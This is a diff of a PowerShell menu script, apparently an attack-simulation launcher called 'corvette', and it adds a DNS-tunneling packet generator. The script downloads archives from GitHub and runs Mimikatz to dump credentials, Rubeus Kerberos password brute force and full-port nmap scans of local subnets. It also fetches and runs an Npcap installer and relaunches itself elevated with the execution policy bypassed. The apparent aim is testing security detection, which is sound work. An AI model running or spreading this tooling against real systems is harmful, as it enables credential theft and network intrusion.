@@ -1,4 +1,3 @@
-
 function IsFile ([string]$path) {
     return [IO.File]::Exists($path)
 }
@@ -60,21 +59,55 @@ function DownloadAndExtractArchive ([string]$url, [string]$directory) {
     Remove-Item $file
 }
 
+function AskYesNo($message) {
+    do {
+        $answer = Read-Host "$message [Y/n]"
+        $answer = $answer.ToLower()
+        if ($answer -eq "yes" -Or $answer -eq "y") {
+            return $true
+        } elseif ($answer -eq "no" -Or $answer -eq "n") {
+            return $false
+        }
+    } while ($true)
+    return $false
+}
+
+function Quote($value) {
+    if ($value -is [array]) {
+        return $value | % { (Quote $_) }
+    } else {
+        return "`"$value`""
+    }
+}
+
 class Properties {
     [string]$my_script
     [string]$home_dir
+    [System.Management.Automation.InvocationInfo]$invocation_info
 
-    Properties([System.Management.Automation.InvocationInfo]$info, [string]$home_dir) {
+    Properties([System.Management.Automation.InvocationInfo]$info) {
+        $this.invocation_info = $info
+        $this.home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"
+
         if ([string]::IsNullOrEmpty($info.MyCommand.Path)) {
             $this.my_script = $info.MyCommand
         } else {
             $this.my_script = [System.IO.File]::ReadAllText($info.MyCommand.Path)
         }
-        $this.home_dir = $home_dir
     }
-    
-    [void]MakeSureHomeDirectoryPathExists() {
+
+    hidden [void]Initialize() {
         New-Item -ItemType Directory -Force -Path $this.home_dir
+    }
+
+    [string]MakeSureScriptFileExists() {
+        $path = $myInvocation.MyCommand.Path
+        if ([string]::IsNullOrEmpty($path)) {
+            $path = BuildFullPath $this.home_dir ".\corvette.ps1"
+            $utf8n = New-Object System.Text.UTF8Encoding($false)
+            [System.IO.File]::WriteAllText($path, $this.my_script, $utf8n)
+        }
+        return $path
     }
 }
 
@@ -90,7 +123,7 @@ class Mimikatz {
         $this.Prepare()
     }
 
-    hidden [void] Prepare() {
+    hidden [void]Prepare() {
         if (!(IsFile $this.mimikatz_exe)) {
             $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
             DownloadAndExtractArchive $url $this.mimikatz_dir
@@ -116,7 +149,7 @@ class PortScan {
         $this.Prepare()
     }
 
-    hidden [void] Prepare() {
+    hidden [void]Prepare() {
         if (!(IsFile $this.nmap_exe)) {
             $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
             DownloadAndExtractArchive $url $this.nmap_dir
@@ -124,16 +157,14 @@ class PortScan {
     }
 
     [void]Run() {
-        $subnet_list = Get-NetIPAddress -AddressFamily IPV4 `
+        $subnet_list = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                      | select IPAddress, PrefixLength `
                      | % { $_.IPAddress + '/' + $_.PrefixLength }
         foreach ($subnet in $subnet_list) {
-            if (!$subnet.StartsWith("127.")) {
-                Write-Host "Starting a port scan: $subnet"
+            Write-Host "Starting a port scan: $subnet"
 
-                $args = @("-p", "1-65535", $subnet)
-                Start-Process -FilePath $this.nmap_exe -ArgumentList $args
-            }
+            $args = Quote @("-p", "1-65535", $subnet)
+            Start-Process -FilePath $this.nmap_exe -ArgumentList $args
         }
     }
 }
@@ -150,7 +181,7 @@ class KerberosBruteForce {
         $this.Prepare()
     }
 
-    hidden [void] Prepare() {
+    hidden [void]Prepare() {
         if (!(IsFile $this.rubeus_exe)) {
             $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
             DownloadAndExtractArchive $url $this.rubeus_dir
@@ -162,7 +193,7 @@ class KerberosBruteForce {
     }
 
     [void]Run() {
-        $args = @("brute", "/passwords:$($this.passwords_file)", "/noticket")
+        $args = Quote @("brute", "/passwords:$($this.passwords_file)", "/noticket")
         Start-Process -FilePath $this.rubeus_exe -ArgumentList $args
     }
 }
@@ -179,7 +210,7 @@ class WildFireTestPE {
         $this.Prepare()
     }
 
-    hidden [void] Prepare() {
+    hidden [void]Prepare() {
         if (!(IsFile $this.wildfire_exe)) {
             New-Item -ItemType Directory -Force -Path $this.wildfire_dir
 
@@ -190,6 +221,89 @@ class WildFireTestPE {
 
     [void]Run() {
         Start-Process -FilePath $this.wildfire_exe -WorkingDirectory $this.props.home_dir
+    }
+}
+
+class DnsTunneling {
+    [Properties]$props
+    [string]$iptgen_dir
+    [string]$iptgen_exe
+    [string]$iptgen_json
+
+    DnsTunneling([Properties]$props) {
+        $this.props = $props
+        $this.iptgen_dir = BuildFullPath $props.home_dir ".\iptgen"
+        $this.iptgen_exe = BuildFullPath $this.iptgen_dir ".\bin\iptgen.exe"
+        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\dns_tunneling_template.json"
+        $this.Prepare()
+    }
+
+    hidden [void]Prepare() {
+        if (!(IsFile $this.iptgen_exe)) {
+            $url = "https://github.com/spearmin10/iptgen/releases/download/0.6.0/iptgen.win32.zip"
+            DownloadAndExtractArchive $url $this.iptgen_dir
+        }
+        if (!(IsFile $this.iptgen_json)) {
+            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/dns_tunneling_template.json"
+            DownloadFile $url $this.iptgen_json
+        }
+        if (!(IsFile $env:WINDIR\system32\Npcap\wpcap.dll)) {
+            $url = "https://github.com/spearmin10/corvette/blob/main/bin/npcap-1.72.exe?raw=true"
+            $path = DownloadFile $url "npcap-1.72.exe"
+            Start-Process -FilePath $path -Wait
+        }
+    }
+
+    hidden [string]SelectInterface() {
+        $interfaces = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
+                    | ForEach-Object {$_.InterfaceAlias} `
+                    | Sort-Object
+        if ($interfaces.Length -eq 0) {
+            Write-Host "No network interfaces were found."
+            return $null
+        }
+        Write-Host "************************************"
+        $i = 1
+        foreach ($interface in $interfaces) {
+            Write-Host " $i) $interface"
+            $i++
+        }
+        Write-Host " 0) [Exit Menu]"
+
+        $num = -1
+        while ($num -ne 0) {
+            $selected = Read-Host "Select an interface to replay packets"
+            if ([int]::TryParse($selected, [ref]$num) -And $num -gt 0 -And $num -le $interfaces.Length) { 
+                return $interfaces[$num - 1]
+            }
+        }
+        return $null
+    }
+
+    [void]Run() {
+        $interface = $this.SelectInterface()
+        if ([string]::IsNullOrEmpty($interface)) {
+            return
+        }
+        Write-Host ""
+        do {
+            Write-Host "### Enter the DNS tunneling configuration"
+            $client_ip = (Read-Host "DNS client IP").Trim()
+            $server_ip = (Read-Host "DNS server IP").Trim()
+            $domain = (Read-Host "DNS tunnel domain").Trim()
+            if ($client_ip -And $server_ip -And $domain) {
+                $Env:client_ip = $client_ip
+                $Env:server_addr = $server_ip + ":53"
+                $Env:domain = $domain
+                break
+            }
+            Write-Host "Please enter all the parameters."
+        } while ($true)
+
+        if (AskYesNo "Are you sure you want to run?") {
+            $args = Quote @("--in.file", $this.iptgen_json, "--out.eth", $interface)
+            Start-Process -FilePath $this.iptgen_exe -ArgumentList $args
+        }
     }
 }
 
@@ -204,23 +318,29 @@ class Menu {
     hidden [bool]LaunchUserModeCommand($cmd) {
         switch ($cmd) {
             "0" {
+                <#
                 $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($this.props.my_script))
-                $args = @("-e", $script)
-                Start-Process -FilePath powershell.exe -verb runas -ArgumentList $args
+                $args = Quote @("-e", $script)
+                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
+                #>
+                $path = $this.props.MakeSureScriptFileExists()
+                $args = Quote @("-ExecutionPolicy", "Bypass", $path)
+                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
             }
             "1" {
-                Start-Process -FilePath cmd.exe -WorkingDirectory $this.props.home_dir
+                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
             }
             "2" {
-                Start-Process -FilePath powershell.exe -WorkingDirectory $this.props.home_dir
+                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
             }
             "3" {
                 $args = @("/k cd /d `"$($this.props.home_dir)`"")
-                Start-Process -FilePath cmd.exe -verb runas -ArgumentList $args
+                Start-Process -FilePath "cmd.exe" -verb runas -ArgumentList $args
             }
             "4" {
-                $args = @("-NoExit", "-Command", "cd `"" + $this.props.home_dir + "`"")
-                Start-Process -FilePath powershell.exe -verb runas -ArgumentList $args
+                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("cd " + (Quote $this.props.home_dir)))
+                $args = @("-NoExit", "-e", $script)
+                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
             }
             "5" {
                 [Mimikatz]::New($this.props).Run($false)
@@ -258,18 +378,21 @@ class Menu {
             Write-Host " 7) Run port scan"
             Write-Host " 8) Run Kerberos Brute Force"
             Write-Host " 9) Run WildFire Test PE"
-
-            while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
+            try {
+                while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
+            } catch {
+                Write-Host $_
+            }
         }
     }
 
     hidden [bool]LaunchAdminModeCommand($cmd) {
         switch ($cmd) {
             "1" {
-                Start-Process -FilePath cmd.exe -WorkingDirectory $this.props.home_dir
+                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
             }
             "2" {
-                Start-Process -FilePath powershell.exe -WorkingDirectory $this.props.home_dir
+                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
             }
             "3" {
                 [Mimikatz]::New($this.props).Run($false)
@@ -282,6 +405,9 @@ class Menu {
             }
             "6" {
                 [WildFireTestPE]::New($this.props).Run()
+            }
+            "7" {
+                [DnsTunneling]::New($this.props).Run()
             }
             default {
                 return $false
@@ -300,8 +426,12 @@ class Menu {
             Write-Host " 4) Run port scan"
             Write-Host " 5) Run Kerberos Brute Force"
             Write-Host " 6) Run WildFire Test PE"
-
-            while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
+            Write-Host " 7) Generate DNS tunneling packets"
+            try {
+                while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
+            } catch {
+                Write-Host $_
+            }
         }
     }
 
@@ -315,8 +445,7 @@ class Menu {
     }
 }
 
-$home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"
-$props = [Properties]::New($MyInvocation, $home_dir)
-$props.MakeSureHomeDirectoryPathExists()
+$props = [Properties]::New($MyInvocation)
+$props.Initialize()
 
 [Menu]::New($props).OpenMenu()
